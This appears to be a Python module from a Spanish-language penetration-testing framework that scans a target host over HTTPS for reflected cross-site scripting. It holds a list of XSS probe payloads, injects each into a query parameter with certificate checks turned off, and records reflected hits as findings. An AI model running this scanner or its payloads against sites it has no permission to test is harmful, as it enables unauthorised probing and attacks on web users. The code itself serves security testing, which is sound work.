# scripts/https/attack/xss_detect.py
import ssl, urllib.request, urllib.error, urllib.parse
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>", "<svg/onload=alert(1)>",
    "javascript:alert(1)", "<body onload=alert(1)>",
    "\"onmouseover=\"alert(1)", "';alert(1)//",
]

class Script(BaseScript):
    name        = "xss-detect"
    protocol    = "https"
    category    = "attack"
    description = "Detección de XSS reflejado sobre HTTPS."

    EXAMPLES = [
        {"flag": "--path / --param", "desc": "Ruta y parámetro",
         "good": "https --script=xss-detect -t 10.10.10.5 --path /search --param q",
         "bad":  "https --script=xss-detect (usa defaults)"},
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 443)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        param   = kwargs.get("param") or "q"
        ip      = self.target.ip
        base    = f"https://{ip}:{port}"

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        opener   = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        findings = []

        for payload in XSS_PAYLOADS:
            url = f"{base}{path}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                try:
                    resp = opener.open(req, timeout=timeout)
                    body = resp.read(65536).decode("utf-8", errors="replace")
                except urllib.error.HTTPError as e:
                    body = e.read(65536).decode("utf-8", errors="replace") if e else ""
                if payload in body:
                    findings.append(("Reflexión directa", payload[:60]))
                    session_db.save_finding(ip, "HTTPS", "xss_reflected",
                                            f"param={param} payload={payload[:40]}")
                elif "<script" in body.lower() and "alert" in body.lower():
                    findings.append(("Reflexión parcial", payload[:60]))
            except Exception:
                pass

        if findings:
            print_table(f"XSS HTTPS — {ip}:{port}", ["Tipo","Payload"], findings)
            print_result("HTTPS", ip, "pwned", f"XSS REFLEJADO en '{param}'")
        else:
            print_check(f"Sin XSS en '{param}'", ok=True)

        return findings
